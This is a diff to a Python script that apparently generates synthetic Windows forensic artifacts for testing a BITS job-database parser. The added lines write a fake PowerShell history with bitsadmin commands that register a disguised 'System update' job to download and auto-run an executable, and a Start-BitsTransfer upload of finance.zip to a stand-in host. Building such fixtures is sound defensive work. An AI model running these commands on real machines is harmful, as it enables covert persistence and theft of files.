@@ -12,7 +12,7 @@ deleted entry in slack.
 """
 import os, sys, uuid
 
-from test_bits_qmgr_parser import job_blob, file_blob, indx_block
+from bits_synth import job_blob, file_blob, indx_block
 
 EDGE = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
 SYS32 = "C:\\Windows\\System32\\"
@@ -54,6 +54,14 @@ def build(out):
         fh.write(bytes(512) + bytes(64).join(recs) + bytes(512))
     with open(os.path.join(out, "$I30"), "wb") as fh:
         fh.write(indx_block(["edb.log", "qmgr.db", "qmgr.jfm"], ["edb00042.log"]))
+    with open(os.path.join(out, "ConsoleHost_history.txt"), "w", encoding="utf-8") as fh:
+        fh.write("Get-ChildItem\n"
+                 "bitsadmin /create \"System update\"\n"
+                 "bitsadmin /addfile \"System update\" http://127.0.0.1/nonexistent.exe C:\\Users\\Public\\mail.exe\n"
+                 "bitsadmin /SetNotifyCmdLine \"System update\" C:\\Users\\Public\\mail.exe \"mail.exe -k\"\n"
+                 "Start-BitsTransfer -Source C:\\Users\\demo\\Documents\\finance.zip "
+                 "-Destination http://203.0.113.7/upload -TransferType Upload\n"
+                 "Get-BitsTransfer -AllUsers\n")
     return out
 
 
